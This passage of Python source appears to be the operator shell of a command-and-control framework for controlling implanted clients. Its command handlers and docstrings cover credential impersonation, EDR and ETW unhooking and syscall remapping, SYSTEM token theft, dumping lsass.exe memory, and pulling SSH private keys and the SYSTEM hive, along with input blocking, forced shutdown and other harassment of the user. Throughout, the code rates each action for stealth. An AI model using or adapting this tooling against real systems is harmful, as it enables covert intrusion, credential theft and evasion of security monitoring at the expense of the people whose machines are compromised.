        By default this command will do a network login. If the "-i"/"--interactive"
        argument is supplied, an interactive login attempt will be made.

        Alias of "make_token".

        Examples:
            loginas alice
            loginas -i bob Password123
            loginas corp\\bob Password123
            loginas -d example.com joe password1
        """
        self.do_make_token(*a)

    def do_mktoken(self, *a):
        """
        mktoken [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]

        OS:    Any
        OPsec: Maybe (Network/ETW logs?)
        Admin: No

        Perform a network login with the supplied credentials. The command will
        NOT use any stored credentials and will only use the credentials specified.

        This allows for any commands/access outside of the local device to be
        authenticated as the target user. The current process username will NOT
        change as this only affects REMOTE resources.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

        By default this command will do a network login. If the "-i"/"--interactive"
        argument is supplied, an interactive login attempt will be made.

        Alias of "make_token".

        Examples:
            mktoken alice
            mktoken bob Password123
            mktoken corp\\bob Password123
            mktoken -d example.com joe password1
        """
        self.do_make_token(*a)

    def do_funcmap(self, *a):
        """
        funcmap <ls|add|del|del_all> [function] [-r|--raw] [data]

        OS:    Windows
        OPsec: Safe-ish (depends on arguments)
        Admin: No

        NOTE: This ability must be compiled in the client in order to work!
        Otherwise this command will always return an error. Check the "Abilities"
        section using "info" and look for "funcmap" to determine if this is avaliable.

        Create a new memory segment and write the trampaline and syscall to the
        memory and subsitute if for the supplied Nt* function name.

        This function allows for bypassing ETW and/or EDR hooking and can be used
        to call Nt* functions through our own memory block. Due to this, all
        functions this command applies to are Nt* (syscall) functions in ntdll.dll.

        This commands takes arguments similar to "patch_dll" and "check_dll",
        except for the function name is explicit and no local paths are allowed.

        The "action" method is also required and takes the following values:

        ls
        |  Reterive a listing of the current remapped functions and their memory
        |  addresses. The names of the functions returned are hashed using FNV32
        |  and are not their direct names.

        add
        |  Add a function to be remapped. This requires the function name and
        |  a data source. If the client is not using this function, this will return
        |  and error of "File not Found". Any data passed to this command will be
        |  evaluated for Data Specification Identifiers, but will default to a
        |  local file path.
        |
        |  See "help data" for more info on Data Specification Identifiers.
        |
        |  The "--raw" option may be used to indicate that the passed bytes, file
        |  or string is raw Assembly and should not be parsed by the DLL loader.

        del, delete, remove
        |  Remove a remapped function. This only requires the function name.

        del_all, delete_all, remove_all
        |  Remove ALL currently remapped functions. This does not require any
        |  additional arguments.

        Examples:
            funcmap ls
            funcmap remove_all
            funcmap del NtQuerySystemInformation
            funcmap add NtCreateThreadEx ~/ntdll.dll
            funcmap add NtOpenProcess -r b$\\x43\\x90\\x0F\\x05
        """
        if _is_help(a):
            return self.do_help("funcmap")
        if len(a) == 0:
            return print("funcmap <ls|add|del|del_all> [function] [data]")
        r = PARSERS[PARSER_FUNCMAP].parse_args(a, nones=False)
        if not nes(r.action):
            return print("funcmap <ls|add|del|del_all> [function] [data]")
        self._exec(
            self.shell.cirrus.task_funcmap,
            action=r.action,
            function=r.function,
            data=r.data,
            raw=r.raw,
        )
        del r

    def do_poweroff(self, *a):
        """
        poweroff [-r|--reason <N>] [-t|--seconds <N>] [-f|--force] [message]

        OS:    Any
        OPsec: I guess?
        Admin: Maybe (depends on permissions)

        Triggers a shutdown of the client device.

        Force "-f" can be used to forcefully disconnect and shutdown the device,
        preventing it from waiting based on running user programs.

        The "-r" specifies the reason code, which determines what is written in
        the Windows event log. Hex values for this option are accepted. This
        option and the "-f" force option are only used for Windows clients.

        The "-s" seconds value can be specified to delay the shutdown for the period
        of time specified. If omitted, this defaults to zero.

        Any text that is not an argument is taken as a message string that is
        displayed to Windows clients in the "shutdown" message. This message may
        use Data Specification Identifiers to display raw or Base64 data, but it
        will not accept file paths. If no identifiers are found, it defaults to
        a string.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            poweroff -r 0xFA -s 15
            poweroff -s 30 All your base are belong to us!
        """
        if _is_help(a):
            return self.do_help("poweroff")
        if len(a) == 0 and not do_ask("Poweroff this device"):
            return
        r = PARSERS[PARSER_POWER].parse_args(a, cat=" ")
        self._exec(
            self.shell.cirrus.task_power,
            action="shutdown",
            message=r.message,
            force=r.force,
            seconds=r.seconds,
            reason=r.reason,
        )
        del r

    def do_wallpaper(self, p):
        """
        wallpaper <data>

        OS:    Windows
        OPsec: Not Safe! (only if a local file is used), Disk Write
        Admin: No

        Changes the current user's wallpaper. The behavior of this command is
        affected by the path specified. This function fails if the client is
        not running in a Desktop session.

        If no Data Specification Identifier is found or the identifier indicates
        |  any identifier that is NOT external, the raw contents will be loaded
        |  into memory and sent to the client.  The wallpaper will be saved to
        |  disk before setting the new wallpaper.

        If the data contains a Remote File Path Data Specification Identifier,
        |  path will be sent to the client to load the path directly from disk.
        |  This will process local client environment variables.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            wallpaper ~/troll.png
            wallpaper x$C:/Windows/web/web1.jpg
        """
        if len(p) == 0:
            return print("wallpaper <data>")
        self._exec(self.shell.cirrus.task_wallpaper, data=p)

    def do_zerotrace(self, _):
        """
        zerotrace

        OS:    Windows
        OPsec: Safe
        Admin: No

        Attempts to prevent any ETW/Debugging logs by NOP-ing/RET-ing the
        ETW event and debugging Windows API function calls.

        This is a helper function that aliases "evade patch_etw".
        """
        self.do_evade("patch_etw")

    def do_upload(self, f, p):
        """
        upload <data> [remote_path]

        OS:    Any
        OPsec: Not Safe! Disk Write
        Admin: Maybe (depends on target)

        Upload a local file to the client at the supplied remote_path.

        If the remote file path is omitted or empty, the basename of the current
        file will be used and it will be placed in the client's current working
        directory.

        Environment variables are processed on the client (for the remote_path).

        Data passed to this command will be evaluated for Data Specification
        Identifiers, but will default to a local file.

        See "help data" for more info on Data Specification Identifiers.

        Examples:
            upload ~/file
            upload ~/hacker_file.txt C:/file.txt
            upload note.txt $USERPROFILE/Desktop/note.txt
        """
        if not nes(f):
            return print("upload <data> [remote_path]")
        if not nes(p):
            p = basename(f)
        self._exec(self.shell.cirrus.task_upload, data=f, dest=p)

    def do_getsystem(self, _):
        """
        getsystem

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on target)

        Attempt to steal and use a token from a built in list of standard processes.

        This function is a wrapper for the "elevate" command that uses the following
        processes for elevation:

        - svchost.exe
        - winlogon.exe
        - wininit.exe

        For more fine grain control of the target(s), use the "elevate" or "steal"
        commands.
        """
        f = Filter()
        f.elevated = True
        f.include = ["svchost.exe", "winlogon.exe", "wininit.exe"]
        self._system("elevate", filter=f)
        del f

    def do_workhours(self, *a):
        """
        workhours [-d|--days <SMTWRFS>] [-s|--start <HH:MM>] [-e|--end <HH:MM>]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Update the client working hours and/or days. The values set by this command
        are specified by arguments instead of directly to avoid confusion.

        The "-d"/"--days" argument specifies a day value string that specifies the
        days this client may operate on. This takes the form of a "SMTWRFS" string
        (Sunday as the first day). The day values do not have to be in order except
        for Sunday (S) which MUST be the first "S" in order to be detected. If empty
        or ignored, this is treated as all days or "SMTWRFS".

        The "-s"/"--start" argument takes a value in the form of "HH:MM" which
        specifies the time this client may start operating. If this value is omitted
        or empty it will be treated as the start of the next avaliable working
        or enabled day.

        The "-e"/"--end" argument takes a value in the form of "HH:MM" which
        specifies the time this client must stop operating. If this value is omitted
        or empty it will be treated as midnight and the client will stop operating
        if the next day is not avaliable OR if start hours are set, which it will
        wait for the start hours to be valid first.

        If no arguments are specified, this will display the current working hours
        settings.

        Examples:
            workhours
            workhours -s 9:30 -e 16:30
            workhours -d SMTFS -e 18:30
            workhours -d MFWRF -s 8:45 -e 17:30
        """
        if _is_help(a):
            return self.do_help("workhours")
        if len(a) == 0:
            s = self.shell.cirrus.session(self.id)
            w = s.get("work_hours")
            if not isinstance(w, dict) or len(w) == 0:
                del w, s
                return print("No Work Hours are set")
            print("Work Hours:")
            d = w.get("days")
            if nes(d):
                print(f'  {"Days":<12}{d}')
            del d
            k, j = w.get("start_hour"), w.get("start_min")
            if isinstance(k, int) and isinstance(j, int):
                print(f'  {"Start:":<12}{k:02}:{j:02}')
            del k, j
            f, g = w.get("end_hour"), w.get("end_min")
            if isinstance(f, int) and isinstance(g, int):
                print(f'  {"End:":<12}{f:02}:{g:02}')
            del w, s, f, g
            return
        r = PARSERS[PARSER_WORKHOURS].parse_args(a, nones=False)
        if r.clear:
            self._exec(self.shell.cirrus.task_workhours, days="", start="", end="")
        elif nes(r.days) or nes(r.start) or nes(r.end):
            self._exec(
                self.shell.cirrus.task_workhours, days=r.days, start=r.start, end=r.end
            )
        del r

    def do_check_dll(self, *a):
        """
        check_dll [-r|--raw] [-f|--function <function>] <remote_dll_name> [data]

        OS:    Windows
        OPsec: Safe-ish (depends on arguments)
        Admin: No

        Inspect the memory region or function (if supplied) of the supplied DLL
        name or path to determine if any hooks are present.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32. The ".dll" extension may also
        be omitted regardless of full path or name. Functions may be specified
        with the "-f" argument.

        Function checks without any source (or the "--raw" argument) will just
        perform a JMP instruction check in the first 4 bytes to determine if there
        is any long JMPs in place.

        Any source data in this function will be used to compare against. If no
        function is specified with no source, this will load the file from the
        local client file system. Any data passed to this function will be evaluated
        for Data Specification Identifiers, but will default to a local file path.

        See "help data" for more info on Data Specification Identifiers.

        The "--raw" option may be used to indicate that the passed bytes, file or
        string is raw Assembly and should not be parsed by the DLL loader. When
        used without source, this indicates to the client to compare against the
        parsed local file on the client. This is only valid when a function is
        specified.

        Examples:
            check_dll ntdll
            check_dll ntdll.dll -f NtOpenProcess
            check_dll C:/Windows/System32/shell32.dll
            check_dll kernel32.dll -f CreateEventW b$\\x40\\x43
            check_dll C:/Windows/System32/user32 -f MessageBoxW ~/local_user32.dll
        """
        if _is_help(a):
            return self.do_help("check_dll")
        if len(a) == 0:
            return print("check_dll <remote_dll_name> [data]")
        r = PARSERS[PARSER_CHECK].parse_args(a, nones=False)
        if not nes(r.dll):
            return print("check_dll <remote_dll_name> [data]")
        if not nes(r.data) and not r.raw and nes(r.function):
            print(
                "[+] This will run a simple JMP check and may return false positives. Use this command "
                'with the matching local DLL file to compare or use "--raw" to use the local DLL source.'
            )
        self._exec(
            self.shell.cirrus.task_check,
            dll=r.dll,
            function=r.function,
            data=r.data,
            raw=r.raw,
        )
        del r

    def do_patch_dll(self, *a):
        """
        patch_dll [-r|--raw] [-f|--function <function>] <remote_dll_name> [data]

        OS:    Windows
        OPsec: Safe-ish (depends on arguments)
        Admin: No

        Overwrite the memory region or function (if supplied) of the supplied DLL
        name, eliminating any hooks placed on DLL functions.

        A DLL name, such as ntdll, kernel32 or shell32 for example may be
        specified. If a path is specified, the full path may be omitted if the
        DLL is a well known DLL, such as shell32. The ".dll" extension may also
        be omitted regardless of full path or name. Functions may be specified
        with the "-f" argument.

        Any source data in this command will be used as the patch data. If no
        source is specified, this will load the file from the local client file
        system. Any data passed to this command will be evaluated for Data
        Specification Identifiers, but will default to a local file path.

        See "help data" for more info on Data Specification Identifiers.

        The "--raw" option may be used to indicate that the passed bytes, file or
        string is raw Assembly and should not be parsed by the DLL loader.

        Examples:
            patch_dll ntdll
            patch_dll ntdll.dll
            patch_dll ntdll.dll -f NtCreateThreadEx b$\\x40\\x4E\\x90
            patch_dll C:/Windows/System32/shell32.dll -f ShellExecuteW
            patch_dll kernel32.dll -f OpenProcess ~/local_kernel32.dll
        """
        if _is_help(a):
            return self.do_help("patch_dll")
        if len(a) == 0:
            return print("patch_dll <remote_dll_name> [data]")
        r = PARSERS[PARSER_CHECK].parse_args(a, nones=False)
        if not nes(r.dll):
            return print("patch_dll <remote_dll_name> [data]")
        self._exec(
            self.shell.cirrus.task_patch,
            dll=r.dll,
            function=r.function,
            data=r.data,
            raw=r.raw,
        )
        del r

    def do_troll(self, a, arg):
        """
        troll <block_input|bi|high_contrast|hc|swap_mouse|sm|wtf> [arg]

        OS:    Windows
        OPsec: Safe
        Admin: Maybe (depends on action)

        Performs a "troll" action. Many of these can be used to annoy/frustrate
        the current user. Some actions may require elevated privileges.

        If no enable/disable is specified, this commands defaults to "enable".

        The following are valid actions:

        bi, block_input
        |  Blocks all user input (including the mouse), rending the console useless.
        |  This requires elevated privileges.

        hc, high_contrast
        |  Swaps the current Windows theme to the high contrast theme.

        sm, swap_mouse
        |  Swaps the left and right mouse buttons.

        wtf:
        |  Enables WTF mode. This causes all active windows on the current user
        |  session to change opacity, move, resize and minimize/maximize randomally
        |  for the specified duration (in seconds). If no duration is specified
        |  it will default to 30 seconds.

        Examples:
            troll sm
            troll hc false
            troll block_input
        """
        if _is_help(a):
            return self.do_help("troll")
        if not nes(a):
            return print("troll <action> [enable|disable]")
        if a[0] == "w" or a[0] == "w":
            if nes(arg):
                try:
                    return self._exec(
                        self.shell.cirrus.task_troll, action=a, seconds=int(arg)
                    )
                except ValueError:
                    return print("[!] WTF argument must be a number of seconds!")
            return self._exec(self.shell.cirrus.task_troll, action=a, arg1=None)
        self._exec(
            self.shell.cirrus.task_troll, action=a, enable=not nes(arg) or is_true(arg)
        )

    def do_parent_pid(self, v):
        """
        parent_pid [pid]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter PID. If the PID argument is omitted or empty,
        the PID value is cleared.

        PID settings on filters take precedence over all other settings.

        This command changes the behavior of all command based functions and will
        attempt to target the specified PID. If the PID no longer exists, all
        commands ran will fail with an error.

        Examples:
            parent_pid
            parent_pid 1337
        """
        if self.filter is None:
            self.filter = Filter()
        c = False
        if len(v) == 0:
            c = self.filter.pid is not None
            self.filter.pid = None
        else:
            try:
                p = int(v)
            except ValueError:
                return print(f'[!] PID "{v}" is not a valid integer!')
            if p <= 0:
                return print("[!] PID must be greater than zero!")
            c = self.filter.pid != c
            self.filter.pid = p
            del p
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_screenshot(self, d):
        """
        screenshot [output_file]

        OS:    Windows
        OPsec: Safe
        Admin: No

        Takes a screenshot of the current desktop. This may fail if the client
        is running in a service context. The file is saved as a PNG to the
        supplied local path. If the path is empty, or omitted, a path based
        on the current directory and the Bolt ID will be used instead.

        Examples:
            screenshot
            screenshot ~/screenshot-1.png
        """
        self._system("screenshot", out=d)

    def do_download(self, f, p):
        """
        download <remote_file> [local_path]

        OS:    Any
        OPsec: Safe
        Admin: Maybe (depends on target)

        Download a remote file. If the local path is non-empty and not omitted,
        the downloaded contents will be saved to that local path. Otherwise the
        contents of the file will be displayed on screen, similar to the "cat"
        command.

        Environment variables are processed on the client (for the remote_path).

        Examples:
            download /root/.ssh/id_rsa ~/keys.pem
            download C:/important-file.txt
            download C:/Windows/system32/config/SYSTEM system.reg
        """
        if not nes(f):
            return print("download <remote_file> [local_path]")
        self._exec(self.shell.cirrus.task_download, target=f, dest=p)

    def do_procdump(self, v, o):
        """
        procdump [pid | process_name] [output_file]

        OS:    Any except WASM
        OPsec: Safe
        Admin: Maybe (depends on target)

        Dump the memory of a target process.

        If the pid and/or name is not supplied, the parent filter will be used,
        which can be updated with the filter commands.

        If no pid or name is supplied and the parent filter is empty, this will
        return an error.

        Examples:
            procdump
            procdump 1337
            procdump httpd
            procdump lsass.exe
        """
        self._system_filter("procdump", v, o)

    def do_parent_name(self, v):
        """
        parent_name [name1,name2,nameX...]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        This function is an alias of "parent_include" and inverse of "parent_exclude".

        Examples:
            parent_name
            parent_name explorer.exe
            parent_name winlogon.exe,lsass.exe
        """
        return self.do_parent_include(v)

    def do_check_debug(self, _):
        """
        check_debug

        OS:    Any except WASM
        OPsec: Safe
        Admin: No

        Checks if the client process is being debugged. Returns true if a debugger
        is present, false otherwise.
        """
        self._system("check_debug")

    def prompt(self, args=None):
        self.id = args
        self.filter = None
        self._user, self._domain, self._password = "", "", ""
        print(
            f"Entering interactive shell for Bolt {args}.\nDefault execution is ",
            end="",
        )
        if self.shell.no_default_run:
            print(
                'disabled. Execution can only occur with "run", "hup", "shell" or "pwsh".'
            )
        else:
            print("enabled.")
        return f" > Bolts > {args} > "

    def do_make_token(self, *a):
        """
        make_token [-i|--interactive] [-d|--domain <domain>] <[domain\\]user[@domain]> [password]

        OS:    Any
        OPsec: Maybe (Network/ETW logs?)
        Admin: No

        Perform a network login with the supplied credentials. The command will
        NOT use any stored credentials and will only use the credentials specified.

        This allows for any commands/access outside of the local device to be
        authenticated as the target user. The current process username will NOT
        change as this only affects REMOTE resources.

        If a domain is not specified with "-d" or "--domain", it will be parsed
        from the username. Common domain prefixes/suffixes are recognized, such
        as:

        - user@domain
        - domain/user
        - domain\\user

        If a domain is found, the username will be cleaned (without the domain)
        and use and the domain will be used as the new domain value.

        By default this command will do a network login. If the "-i"/"--interactive"
        argument is supplied, an interactive login attempt will be made.

        Examples:
            make_token alice
            make_token bob Password123
            make_token corp\\bob Password123
            make_token -d example.com joe password1
        """
        if _is_help(a):
            return self.do_help("make_token")
        if len(a) == 0:
            return print("make_token <user> [password]")
        r = PARSERS[PARSER_CREDS].parse_args(a, nones=False)
        if not nes(r.user):
            return print("make_token <user> [password]")
        u, d = split_user_domain(r.user, r.domain)
        self._exec(
            self.shell.cirrus.task_login,
            user=u,
            domain=d,
            pw=r.pw,
            interactive=r.interactive,
        )
        del u, d, r

    def do_show_window(self, v):
        """
        show_window [boolean]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Enable/Disable global shell command visibility. If no option is specified,
        command windows are hidden. Can take multiple types of boolean values
        ("true", "T", "t", "yes", "y", "enable", "e", "1").

        Alias of "set_hide"

        Examples:
            show_window
            show_window no
            show_window true
        """
        n = True
        if len(v) > 0:
            n = is_true(v)
        n = not n
        print(f"[+] Set Show Window: {self.show} => {n}.")
        c = self.show != n
        self.show = n
        del n
        return c

    def do_parent_clear(self, _):
        """
        parent_clear

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Clears the global parent filter.

        This command changes the behavior of all command based functions and will
        set the filter behavior back to the default (native).
        """
        if self.filter is None or self.filter.is_empty():
            self.filter = None
            return False
        self.filter.clear()
        self.filter = None
        print("[+] Parent Filter Cleared.")
        return True

    def complete_job(self, n, *_):
        return self.shell.cache.jobs(self.id, n, False)

    def do_parent_desktop(self, v):
        """
        parent_desktop [boolean]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter desktop/session target. A "true" value
        represents a process that is running in a user session and most likely
        has a desktop. "false" values target processes that do NOT have a desktop,
        such as services or lsass.exe.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the desktop/filter option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_desktop
            parent_desktop no
            parent_desktop true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.session != r
        self.filter.session = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_include(self, v):
        """
        parent_include [name1,name2,nameX...]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter included target names. These represent the
        process names that CAN be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that matches one (case-insensitive)
        or more in the supplied list. If none are found, all commands ran will
        fail with an error.

        Inverse of "parent_exclude".

        Examples:
            parent_include
            parent_include explorer.exe
            parent_include winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        r = _split_list(v)
        c = self.filter.include != r
        self.filter.include = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_exclude(self, v):
        """
        parent_exclude [name1,name2,nameX...]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter excluded target names. These represent the
        process names that CANNOT be selected when the filter does not have a PID
        value.

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        The arguments can be a single entry or a list of comma seperated names.
        Omitting the argument will clear the list.

        This command changes the behavior of all command based functions and will
        attempt to target a process with a name that does not match (case-insensitive)
        any in the supplied list. If none are found, all commands ran will fail
        with an error.

        Inverse of "parent_include".

        Examples:
            parent_exclude
            parent_exclude explorer.exe
            parent_exclude winlogon.exe,lsass.exe
        """
        if self.filter is None:
            self.filter = Filter()
        r = _split_list(v)
        c = self.filter.exclude != r
        self.filter.exclude = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def completenames(self, n, *_):
        return make_menu(n, _MENU)

    def complete_help(self, n, *_):
        return make_menu(n, _MENU)

    def complete_evade(self, n, *_):
        return make_menu(n, _EVADE_TYPES)

    def do_parent_elevated(self, v):
        """
        parent_elevated [boolean]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter elevation target. A "true" value represents
        a process that is running in a system or high integrity. "false" values
        target processes that run with lower than high integrity (non-elevated).

        If no PID setting is used, these values will be used in combination with
        the other filter settings to find a target process.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and will
        attempt to target a process with the elevation option chosen (if set).
        If none are found, all commands ran will fail with an error.

        Examples:
            parent_elevated
            parent_elevated no
            parent_elevated true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.elevated != r
        self.filter.elevated = r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def do_parent_fallback(self, v):
        """
        parent_fallback [boolean]

        OS:    n/a
        OPsec: n/a
        Admin: n/a

        Set the global parent filter fallback setting. A "true" value indicates
        that this parent filter can fallback to less restrictive settings if the
        first run did not find any valid targets. "false" values disable the
        ability for fallbacks to occur.

        Omitting the argument will clear this filter option.

        This command changes the behavior of all command based functions and
        while less restrictive on targets, this provides better protection from
        command failures if a target is not found.

        Examples:
            parent_fallback
            parent_fallback no
            parent_fallback true
        """
        if self.filter is None:
            self.filter = Filter()
        r = None
        if len(v) > 0:
            r = is_true(v)
        c = self.filter.fallback != r
        self.filter.fallback = r
        del r
        if c:
            print(f"[+] Parent Filter Updated:\n   {self.filter}")
        else:
            print(f"[+] Parent Filter:\n   {self.filter}")
        return c

    def complete_window(self, n, *_):
        return make_menu(n, ACTIONS_WINDOW)

    def complete_script(self, n, *_):
        return self.shell.cache.scripts(n)

    def complete_wts(self, n, c, *_):
        if len(c) == 0:
            return EMPTY
        if c.count(" ") == 1:
            return make_menu(n, ACTIONS_WTS)
        return EMPTY

    def complete_proxy(self, n, c, *_):
        if len(c) == 0:
            return EMPTY
        if c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return EMPTY

    def complete_troll(self, n, c, *_):
        if len(c) == 0:
            return EMPTY
        if c.count(" ") == 1:
            return make_menu(n, ACTIONS_TROLL)
        if c.count(" ") == 2:
            return make_menu(n, _TOGGLES)
        return EMPTY

    def complete_funcmap(self, n, c, *_):
        if len(c) == 0:
            return EMPTY
        if c.count(" ") == 1:
            return make_menu(n, ACTIONS_FUNCMAP)
        return EMPTY

    def complete_profile(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return EMPTY

    def complete_regedit(self, n, c, *_):
        if len(c) == 0:
            return EMPTY
        if c.count(" ") == 1:
            return make_menu(n, ACTIONS_REG)
        return EMPTY

    def _system_filter(self, c, v, out=None):
        if not nes(v):
            return self._system(c)
        if "/" in v or "\\" in v or v.endswith(".dmp"):
            return self._system(c, out=v)
        self._system(c, out=out, filter=_quick_filter(v))

    def _run(self, name, detach, append, *a):
        if _is_help(a):
            return self.do_help(name)
        if len(a) == 0:
            return print(f"{name} <command>")
        r = PARSERS[PARSER_RUN].parse_args(a, cat=" ")
        if not nes(r.command):
            return print(f"{name} <command>")
        if nes(r.user):
            u, d = split_user_domain(r.user, r.domain)
            p = r.pw
        else:
            u, d, p = self._user, self._domain, self._password
        i = None
        if r.file:
            if not nes(append):
                return print(f'[!] Invalid command type "{name}" to use "file" with!')
            i = r.command
            r.command = append
        elif nes(append):
            r.command = append + r.command
        self._exec(
            self.shell.cirrus.task_execute,
            cmd=r.command,
            show=self.show,
            detach=detach or r.detach,
            filter=self.filter,
            stdin=i,
            user=u,
            domain=d,
            pw=p,
        )
        del i, r, u, d, p

    def _system(self, c, filter=None, out=None):
        if filter is None:
            return self._exec(
                self.shell.cirrus.task_system, cmd=c, out=out, filter=self.filter
            )
        self._exec(self.shell.cirrus.task_system, cmd=c, out=out, filter=filter)

    def do_window(self, a, handle, arg1, arg2, arg3, arg4):
        """
        window <ls|close|disable|enable|focus|input|msgbox|move|show|trans>
        |      [handle|all|*|0
        |      [args..]

        OS:    Windows
        OPsec: Safe-ish
        Admin: Maybe (depends on target)

        Performs an Windows window manager action. The supplied "handle" argument
        is optional for the "ls" and "get" calls and can be replaced with "all"
        (or "0"), which will target all top level windows currently open when the
        command executes.

        Window handles do not change unless the window is closed/reopened, so they
        may be reused without an additional call to "window ls".

        The following are valid actions:

        ls, get
        |  Retrieves the list of windows to choose from. This command also retrieves
        |  the window position, title and size.

        cl, close
        |  Close the target window(s) using a WM_DESTROY message. The "all", "*"
        |  or "0" handle may be used for this comand to select all current windows.

        dis, disable
        |  Disables a window. This prevents the user from interacting with the
        |  window itself. The "all", "*" or "0" handle may be used for this
        |  comand to select all current windows.

        desktop
        |  This is an alias for "window show all minimized" and will show the
        |  user's desktop by minimizing all windows.

        en, enable
        |  Enables a window. This allows a previously disabled window to be used
        |  again after a disable command. The "all", "*" or "0" handle may be used
        |  for this comand to select all current windows.

        fg, focus
        |  Focuses the window and brings user input to it. This command requires
        |  a handle and can only be used on a single window at a time.

        in, input, type
        |  Simulates keystrokes in order to type the message after the action.
        |  Capital and spaces are preserved. If a valid window handle is specified,
        |  this will force focus of the specified window before typing.

        mb, msg, msgbox, message, messagebox
        |  Show a MessagBox prompt as a child of the supplied window handle. A
        |  handle of 0 (or using 'all') will make a standalone MessageBox.
        |  Using '-1' or 'desktop' will attempt to target the current Desktop.
        |
        |  The first argument is the MessageBox title, which is the only required
        |  argument. The second argument is the message content and the third is
        |  the dialog type, which is an int flag. Both of these are optional and
        |  will default to "" and 0.
        |
        |  The title and text options support using raw or Base64 data using
        |  Data Specification Identifiers. They do not support file paths.
        |
        |  See "help data" for more info on Data Specification Identifiers.

        mv, pos, move, size, resize
        |  Moves the target window. This is a function that does not allow "all"
        |  "*" or 0 to be specified as the target can only be a single window.
        |
        |  The arguments to this command are the new X and Y position and the last
        |  two arguments are the optional new width and height which if omitted,
        |  will not change the window size.
        |
        |  The value '-1' can also be used in place for either the 'x' and 'y' or
        |  the 'width' and 'height' to ignore setting that value and leaving it
        |  as the current value.

        sw, show
        |  Sets the window visibility state. The argument to this action is the
        |  visibility state. A number of a Sw* name may be used (without the "Sw"),
        |  such as "minimized" or "maximized". The "all", "*" or "0" handle may
        |  be used for this comand to select all current windows.

        tr, trans, transparent
        |  Sets the transparency level of the window as an argument. This value
        |  may be 0 (completely transparent) to 255 (opaque).
        |
        |  This value may be specified as a percentage with "%" instead which
        |  the level will be computed from. If no value is specified, zero
        |  (transparent) is assumed.
        |
        |  The "all", "*" or "0" handle may be used for this comand to select all
        |  current windows.

        Examples:
            window ls
            window dis all
            window enable 6DF26
            window transparent 3763A6 50%
            window msg 0 "Hello There!" "Hello World!"
            window sw all hide
            window size 7836A -1 -1 100 500
            window mv 7483FE 10 10 -1 -1
            window pos 84A23 200 200 500 750
        """
        if not nes(a):
            return print("window <action> [handle|all|*|0] [args...]")
        if a == "-h" or a == "/?" or a == "--help":
            return self.do_help("window")
        self._exec(
            self.shell.cirrus.task_window,
            action=a,
            handle=handle,
            state=arg1,
            opacity=arg1,
            pos_x=arg1,
            title=arg1,
            pos_y=arg2,
            text=arg2,
            width=arg3,
            flags=arg3,
            height=arg4,
        )
